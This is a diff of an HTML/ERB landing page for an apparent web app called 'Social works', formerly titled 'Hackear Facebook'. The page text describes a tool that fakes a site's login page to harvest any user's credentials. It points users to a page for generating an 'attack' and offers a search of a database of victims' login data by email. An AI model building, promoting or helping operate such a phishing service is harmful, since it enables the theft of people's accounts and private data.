@@ -2,7 +2,7 @@
 <div class="container">
 	<div  class="row">
   	<div class="col-md-12 text-center">
-  		<h1>Hackear Facebook</h1>
+  		<h1>Social works -beta</h1>
   	</div>
   </div>
   <br>
@@ -21,42 +21,60 @@
 			  <label class="control-label" for="inputDefault">Email de la victima</label>
 			  <input type="text" class="form-control" id="inputDefault">
 			  <br>
-			  <a href="#" class="btn btn-primary">ver mas</a>
+			  <a href="#" class="btn btn-danger" data-toggle="modal" data-target="#myModal">Buscar</a>
 			</div>
   		</div>
   		<div class="col-md-4 text-center">
   			<h2>puedes buscar en nuestra base de datos para ver si contamos comos con los datos de tu victima!!!</h2>
-  			<a href="#" class="btn btn-default">ver mas</a>
+  			<a href="/welcome/servicios" class="btn btn-default">ver mas</a>
   		</div>
   	</div>
   	<br>
  	<div  class="row">
  		<div class="col-md-4">
 		  	<div class="col-md-12 jumbotron">
-		  		 <h2>¿Que es?</h2>
+		  		 <h2>¿Que es Social works?</h2>
 		  		 <br>
 		  		 <p>
-		  		 	sdsadsadsads  hb hbh bh bhj  bbhjbh jbh jb bhjbh bjh bhj bhj b hjbh bh bhj bhj bhj bjh bjh bhbhj bh bj hbh bj bjh bjhb hb hb hjb hjb hjb hjb jhb hjb hjb h hj hj hjj hb hjb jhb hjb hjb adsad s dsa
+		  		 	Social works es una herramienta de ingeniería social con la cual se puede simular el login de una pagina web y obtener los datos de inicio de sección de cualquier usuario (siempre y cuando este ingrese sus datos a través de nuestra pagina).
 		  		 </p>
 		  	</div>
 	  	</div>
 	  	<div class="col-md-4">
 			<div class="col-md-12 jumbotron">
-				 <h2>¿Que es?</h2>
+				 <h2>¿Como funciona?</h2>
 				 <br>
 				 <p>
-				 	sdsadsadsads  hb hbh bh bhj  bbhjbh jbh jb bhjbh bjh bhj bhj b hjbh bh bhj bhj bhj bjh bjh bhbhj bh bj hbh bj bjh bjhb hb hb hjb hjb hjb hjb jhb hjb hjb h hj hj hjj hb hjb jhb hjb hjb adsad s dsa
+				 	Esta herramienta funciona de forma muy simple solo es necesario <%=link_to "crear una cuenta" , "/users/sign_up"%> es esta plataforma e ingreses a la pestaña de generar ataque una ves proporcionas un enlace de redirección y listo para mas información ingrese <%=link_to "aquí", "/attacks/new"%>.
 				 </p>
 		  	</div>
 	  	</div>
 	  	<div class="col-md-4">
 		  	<div class="col-md-12 jumbotron">
-		  		 <h2>¿Que es?</h2>
+		  		 <h2>¿Que es ingenieria social?</h2>
 		  		 <br>
 		  		 <p>
-		  		 	sdsadsadsads  hb hbh bh bhj  bbhjbh jbh jb bhjbh bjh bhj bhj b hjbh bh bhj bhj bhj bjh bjh bhbhj bh bj hbh bj bjh bjhb hb hb hjb hjb hjb hjb jhb hjb hjb h hj hj hjj hb hjb jhb hjb hjb adsad s dsa
+		  		 	es la práctica de obtener información confidencial a través de la manipulación de usuarios legítimos.
 		  		 </p>
 		  	</div>
 	  	</div>
  	</div>
+
+ 	<div class="modal fade" id="myModal" role="dialog">
+    <div class="modal-dialog">
+      <div class="modal-content">
+        <div class="modal-header">
+          <button type="button" class="close" data-dismiss="modal">&times;</button>
+          <h4 class="modal-title">Verificacion de usuario</h4>
+        </div>
+        <div class="modal-body">
+          <p>No se cuneta con los datos de inicio de seccion correspondientes a ese correo electronico.</p>
+        </div>
+        <div class="modal-footer">
+          <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+         
+        </div>
+      </div>
+    </div>
+  </div>
 </div>
